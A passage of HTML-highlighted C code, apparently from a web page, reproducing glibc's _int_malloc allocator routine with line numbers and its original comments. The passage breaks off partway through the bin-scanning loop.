class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   ------------------------------ malloc ------------------------------</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx;                 <span class="comment">/* associated bin index */</span></span><br><span class="line">  mbinptr bin;                      <span class="comment">/* associated bin */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr victim;                 <span class="comment">/* inspected/selected chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span></span><br><span class="line">  <span class="type">int</span> victim_index;                 <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr remainder;              <span class="comment">/* remainder from a split */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> remainder_size;     <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> block;               <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> bit;                 <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">map</span>;                 <span class="comment">/* current word of binmap */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr fwd;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr bck;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Convert request size to internal form by adding SIZE_SZ bytes</span></span><br><span class="line"><span class="comment">     overhead plus possibly more to obtain necessary alignment and/or</span></span><br><span class="line"><span class="comment">     to obtain a size of at least MINSIZE, the smallest allocatable</span></span><br><span class="line"><span class="comment">     size. Also, checked_request2size traps (returning 0) request sizes</span></span><br><span class="line"><span class="comment">     that are so large that they wrap around zero when padded and</span></span><br><span class="line"><span class="comment">     aligned.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  checked_request2size (bytes, nb);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">     mmap.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">     This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">     can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp = *fb;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          victim = pp;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">             != victim);</span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">            errout:</span><br><span class="line">              malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          check_remalloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">     hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">     (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">     processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">     anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">                &#123;</span><br><span class="line">                  errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                  <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">              set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">              bin-&gt;bk = bck;</span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">     While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">     even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">     fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">     Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">     large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">     invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">     it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Process recently freed or remaindered chunks, taking one only if</span></span><br><span class="line"><span class="comment">     it is exact fit, or, if this a small request, the chunk is remainder from</span></span><br><span class="line"><span class="comment">     the most recent non-exact fit.  Place other traversed chunks in</span></span><br><span class="line"><span class="comment">     bins.  Note that this step is the only place in any routine where</span></span><br><span class="line"><span class="comment">     chunks are placed in bins.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The outer loop here is needed because we might not realize until</span></span><br><span class="line"><span class="comment">     near the end of malloc that we should have consolidated, so must</span></span><br><span class="line"><span class="comment">     do so and retry. This happens at most once, and only when we would</span></span><br><span class="line"><span class="comment">     otherwise need to expand memory to service a &quot;small&quot; request.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">         sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">        &#123;</span><br><span class="line">          bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">          <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">              (<span class="type">unsigned</span> <span class="type">long</span>) (victim-&gt;size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb))</span><br><span class="line">            &#123;</span><br><span class="line">              victim = victim-&gt;bk_nextsize;</span><br><span class="line">              <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="type">unsigned</span> <span class="type">long</span>) (nb)))</span><br><span class="line">                victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">              <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">                victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                    victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                    &#123;</span><br><span class="line">                      errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">                      <span class="keyword">goto</span> errout;</span><br><span class="line">                    &#125;</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Search for a chunk by scanning bins, starting with next largest</span></span><br><span class="line"><span class="comment">         bin. This search is strictly by best-fit; i.e., the smallest</span></span><br><span class="line"><span class="comment">         (with ties going to approximately the least recently used) chunk</span></span><br><span class="line"><span class="comment">         that fits is selected.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         The bitmap avoids needing to check that most blocks are nonempty.</span></span><br><span class="line"><span class="comment">         The particular case of skipping all bins during warm-up phases</span></span><br><span class="line"><span class="comment">         when no chunks have been returned yet is faster than it might look.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      ++idx;</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line">      block = idx2block (idx);</span><br><span class="line">      <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">      bit = idx2bit (idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (;; )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">          <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">do</span></span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">                    <span class="keyword">goto</span> use_top;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">              bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">              bit = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">          <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">              assert (bit != <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span 